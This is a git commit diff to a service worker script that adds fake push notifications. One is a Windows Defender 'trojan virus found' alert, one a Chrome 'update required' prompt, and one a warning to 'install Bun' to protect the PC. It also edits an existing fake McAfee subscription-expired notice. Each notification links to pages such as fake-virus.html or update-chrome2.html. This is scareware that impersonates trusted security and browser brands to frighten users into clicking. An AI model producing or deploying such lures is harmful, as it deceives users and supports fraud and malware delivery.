e655e839dfaca5216c0dc6bb0cfac119d24ecc88
tiago <70700766+tiagozip@users.noreply.github.com>
2025-02-19 18:51:18 +0000

    Fix link to update Chrome and add new notifications for virus alerts and Bun installation

--- sw.js
+++ sw.js
@@ -43,13 +43,50 @@ function showRandomNotification() {
     {
       title: "McAfee Subscription Expired",
       body: "Your McAfee subscription has expired. Renew now to protect your device.",
-      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/McAfee.png",
+      icon: "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpng.pngtree.com%2Ftemplate%2F20220612%2Fourmid%2Fpngtree-virus-detected-warning-alert-message-on-computer-screen-image_1830770.jpg&f=1&nofb=1&ipt=6c27942c4aff0680bb81b7b67669a942d02a68876bcbbddfda806bf4e34ad424&ipo=images",
       url: "../nnm-ae/1000/gb20-aderror.html",
       actions: [
         { action: "renew", title: "🔒 Renew Now" }
       ],
       actionUrls: {
         renew: "../nnm-ae/1000/gb20-aderror.html"
+      }
+    },
+    {
+      title: "Windows Defender found a virus on your computer!",
+      body: "Windows Defender found a trojan virus on your computer and can remove it for you. This will not slow down your computer and will only take a few seconds. Leaving this virus without deletion might infect your computer.",
+      icon: "http://tetapux.vercel.app/assets/shield.jpg",
+      url: "../pages/fake-virus.html",
+      actions: [
+        { action: "ignore", title: "Ignore (unsafe)" },
+        { action: "remove_virus", title: "🛡️ Remove virus now" }
+      ],
+      actionUrls: {
+        remove_virus: "../pages/fake-virus.html"
+      }
+    },
+    {
+      title: "Bun installation required to secure your PC",
+      body: "You need to install Bun to protect your device from viruses and malware. Click here to install Bun now.",
+      icon: "http://tetapux.vercel.app/assets/danger.png",
+      url: "../red/premium-colors/bun.html",
+      actions: [
+        { action: "remove_virus", title: "🛡️ Install Bun now" }
+      ],
+      actionUrls: {
+        remove_virus: "../red/premium-colors/bun.html"
+      }
+    },
+    {
+      title: "Chrome update required. Update now to keep your Chrome browser running smoothly and securely.",
+      body: "Update now to keep your Chrome browser running smoothly and securely.",
+      icon: "https://www.google.com/chrome/static/images/chrome-logo.svg",
+      url: "../pages/update-chrome2.html",
+      actions: [
+        { action: "remove_virus", title: "Update Chrome" }
+      ],
+      actionUrls: {
+        remove_virus: "../pages/update-chrome2.html"
       }
     }
   ];
